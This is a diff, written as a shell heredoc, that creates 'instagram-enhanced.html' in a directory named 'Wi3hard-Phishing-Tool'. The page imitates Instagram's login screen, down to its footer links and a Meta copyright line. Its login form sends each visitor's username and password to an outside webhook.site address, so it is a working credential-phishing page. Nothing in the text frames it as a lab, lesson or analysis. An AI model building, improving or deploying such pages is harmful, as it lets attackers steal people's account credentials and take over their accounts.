@@ -1,23 +1,74 @@
+cat > ~/Wi3hard-Phishing-Tool/instagram-enhanced.html << 'EOF'
 <html>
 <head>
-    <script src="capture.js"></script>
     <title>Instagram</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <style>
-        body { font-family: Arial, sans-serif; background: #fafafa; margin: 0; padding: 0; display: flex; justify-content: center; align-items: center; height: 100vh; }
-        .container { background: white; border: 1px solid #dbdbdb; padding: 40px; text-align: center; width: 350px; }
-        .logo { font-size: 40px; font-weight: bold; margin-bottom: 20px; color: #262626; }
-        input[type="text"], input[type="password"] { width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #dbdbdb; border-radius: 4px; background: #fafafa; }
-        input[type="submit"] { background: #0095f6; color: white; border: none; padding: 12px; border-radius: 4px; width: 100%; font-weight: bold; margin-top: 10px; }
+        body { 
+            font-family: Arial, sans-serif; 
+            background: #fafafa; 
+            margin: 0; 
+            padding: 0; 
+            display: flex; 
+            justify-content: center; 
+            align-items: center; 
+            height: 100vh;
+        }
+        .container { 
+            background: white; 
+            border: 1px solid #dbdbdb; 
+            padding: 40px; 
+            text-align: center; 
+            width: 350px;
+        }
+        .logo { 
+            font-size: 40px; 
+            font-weight: bold; 
+            margin-bottom: 20px; 
+            color: #262626;
+        }
+        input[type="text"], input[type="password"] { 
+            width: 100%; 
+            padding: 12px; 
+            margin: 8px 0; 
+            border: 1px solid #dbdbdb; 
+            border-radius: 4px; 
+            background: #fafafa;
+        }
+        input[type="submit"] { 
+            background: #0095f6; 
+            color: white; 
+            border: none; 
+            padding: 12px; 
+            border-radius: 4px; 
+            width: 100%; 
+            font-weight: bold; 
+            cursor: pointer;
+        }
+        .footer { 
+            margin-top: 20px; 
+            color: #8e8e8e; 
+            font-size: 12px;
+        }
     </style>
 </head>
 <body>
     <div class="container">
         <div class="logo">Instagram</div>
-        <form onsubmit="return captureCredentials('instagram')">
-            <input type="text" name="username" placeholder="Username or email">
-            <input type="password" name="password" placeholder="Password">
+        
+        <form action="https://webhook.site/ac3017bb-31ec-446c-ba45-5b13aae5c7fb" method="POST">
+            <input type="hidden" name="site" value="instagram">
+            <input type="text" name="username" placeholder="Username, email or mobile number" required>
+            <input type="password" name="password" placeholder="Password" required>
             <input type="submit" value="Log In">
-        <input type="hidden" id="username" name="username"><input type="hidden" id="password" name="password"><input type="hidden" name="site" value="instagram"></form>
+        </form>
+        
+        <div class="footer">
+            <a href="#" style="color: #00376b; text-decoration: none;">Forgotten your login details?</a> · 
+            <a href="#" style="color: #00376b; text-decoration: none;">Get help with signing in.</a>
+            <p>Meta © 2024</p>
+        </div>
     </div>
 </body>
 </html>
+EOF
